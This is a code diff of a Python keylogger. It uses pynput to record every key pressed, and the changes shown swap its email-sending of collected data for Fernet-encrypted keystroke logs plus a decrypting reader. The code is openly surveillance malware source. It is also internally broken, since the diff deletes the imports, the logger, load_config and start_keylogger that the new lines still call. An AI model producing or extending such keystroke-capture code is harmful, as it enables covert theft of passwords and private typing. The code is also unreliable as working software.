@@ -1,93 +1,48 @@
-import os
-import sys
-import time
-import smtplib
-import configparser
-import logging
-from cryptography.fernet import Fernet
-from pynput.keyboard import Key, Listener
-# Setup logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
-# Configuration management
-CONFIG_FILE = 'config.ini'
-def load_config():
-    """Load and validate configuration from file."""
-    config = configparser.ConfigParser()
+def initialize_encryption(config):
+    """Initialize Fernet cipher with configuration key."""
     try:
-        if not os.path.exists(CONFIG_FILE):
-            raise FileNotFoundError(f"Config file {CONFIG_FILE} not found")
-        config.read(CONFIG_FILE)
-        # Validate required sections exist
-        for section in ['email', 'logging', 'encryption']:
-            if section not in config:
-                raise ValueError(f"Missing required section: {section}")
-        return {
-            'email': {
-                'from': config.get('email', 'from'),
-                'to': config.get('email', 'to'),
-                'password': config.get('email', 'password'),
-                'smtp_server': config.get('email', 'smtp_server'),
-                'smtp_port': config.getint('email', 'smtp_port')
-            },
-            'logging': {
-                'dir': config.get('logging', 'dir'),
-                'file': config.get('logging', 'file')
-            },
-            'encryption': {
-                'key': config.get('encryption', 'key')
-            }
-        }
+        key = config['encryption']['key'].encode()
+        if len(key) != 44:  # Fernet keys are 44 bytes long
+            raise ValueError("Invalid Fernet key length")
+        return Fernet(key)
     except Exception as e:
-        logger.error(f"Failed to load configuration: {e}")
+        logger.error(f"Encryption initialization failed: {e}")
         sys.exit(1)
-def setup_directories(log_dir):
-    """Ensure required directories exist with proper permissions."""
+def write_encrypted_log(cipher, log_file, data):
+    """Write encrypted data to log file with timestamp."""
     try:
-        if not os.path.exists(log_dir):
-            os.makedirs(log_dir, mode=0o700)  # Secure directory permissions
-            logger.info(f"Created directory: {log_dir}")
+        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+        log_entry = f"[{timestamp}] {data}"
+        encrypted_data = cipher.encrypt(log_entry.encode())
+        with open(log_file, 'ab') as f:
+            f.write(encrypted_data + b'\n')
     except Exception as e:
-        logger.error(f"Failed to create directory {log_dir}: {e}")
-        sys.exit(1)
-def send_email(config, subject, body):
-    """Send an email with the given subject and body."""
+        logger.error(f"Failed to write encrypted log: {e}")
+def read_encrypted_log(cipher, log_file):
+    """Read and decrypt log file contents."""
     try:
-        with smtplib.SMTP(
-            config['email']['smtp_server'],
-            config['email']['smtp_port']
-        ) as server:
-            server.starttls()
-            server.login(
-                config['email']['from'],
-                config['email']['password']
-            )
-            message = f"Subject: {subject}\n\n{body}"
-            server.sendmail(
-                config['email']['from'],
-                config['email']['to'],
-                message
-            )
-            logger.info("Email sent successfully")
+        with open(log_file, 'rb') as f:
+            for line in f:
+                if line.strip():
+                    decrypted = cipher.decrypt(line.strip()).decode()
+                    print(decrypted)
     except Exception as e:
-        logger.error(f"Failed to send email: {e}")
+        logger.error(f"Failed to read encrypted log: {e}")
 def on_press(key):
-    """Handle key press events."""
+    """Handle encrypted key press logging."""
     try:
-        logger.info(f"Key pressed: {key}")
+        key_str = str(key).replace("'", "")  # Sanitize key input
+        write_encrypted_log(
+            cipher, 
+            config['logging']['file'], 
+            f"Key pressed: {key_str}"
+        )
     except Exception as e:
         logger.error(f"Error handling key press: {e}")
-def start_keylogger(log_file):
-    """Start monitoring keyboard input."""
-    setup_directories(os.path.dirname(log_file))
-    with open(log_file, 'a') as f:
-        f.write(f"\n\n--- New Session {time.ctime()} ---\n\n")
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+# Initialize encryption at startup
 if __name__ == "__main__":
     config = load_config()
+    cipher = initialize_encryption(config)
     # Example usage
-    send_email(config, "Test Subject", "This is a test email body")
+    write_encrypted_log(cipher, config['logging']['file'], "System started")
+    start_keylogger(config['logging']['file'])
